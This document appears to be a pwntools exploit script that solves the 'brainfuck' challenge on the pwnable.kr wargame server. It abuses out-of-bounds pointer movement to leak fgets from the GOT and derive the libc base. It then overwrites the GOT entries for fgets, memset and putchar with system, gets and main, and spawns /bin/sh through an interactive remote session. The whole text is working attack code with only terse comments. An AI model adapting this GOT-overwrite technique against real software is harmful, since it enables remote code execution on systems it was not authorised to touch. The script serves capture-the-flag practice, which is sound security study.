from pwn import *
elf = context.binary = ELF("./brainfuck")
libc = ELF("./libc-2.23.so")
#context.log_level = "debug"

io = remote("pwnable.kr",9001)

tape_start = 0x804a0a0
fgets_got = 0x0804a010
memset_got = 0x0804a02c
putchar_got = 0x804a030

# Leak fgets@got
payload = b'<' * (tape_start - fgets_got)
payload += b'.>' * 4 + b"," + b"<" * 4

# Overwrite fgets@got with system
payload += b",>" * 4 + b"<" * 4

# Overwrite memset@got with gets
payload += b">" * (memset_got - fgets_got)
payload += b",>" * 4 + b"<" * 4

# Overwrite putchar@got with main
payload += b">" * (putchar_got - memset_got)
payload += b",>" * 4 + b"<" * 4
payload += b"."

# Leak libc 
io.sendlineafter(b"]\n",payload)
time.sleep(1.5)

libc_fgets = u32(io.recv(4))
libc.address = libc_fgets - libc.sym['fgets']

log.info(f"fgets@got: {hex(libc_fgets)}")
log.info(f"libc.base: {hex(libc.address)}")

io.send(b"\x00")

# fgets@got --> system
io.send(p32(libc.sym['system']))

# memset@got --> gets
io.send(p32(libc.sym['gets']))

# putchar@got --> main
io.send(p32(elf.sym['main']))

# gets(buffer)
io.sendlineafter(b"]\n",b"/bin/sh")

# Shell
io.interactive()


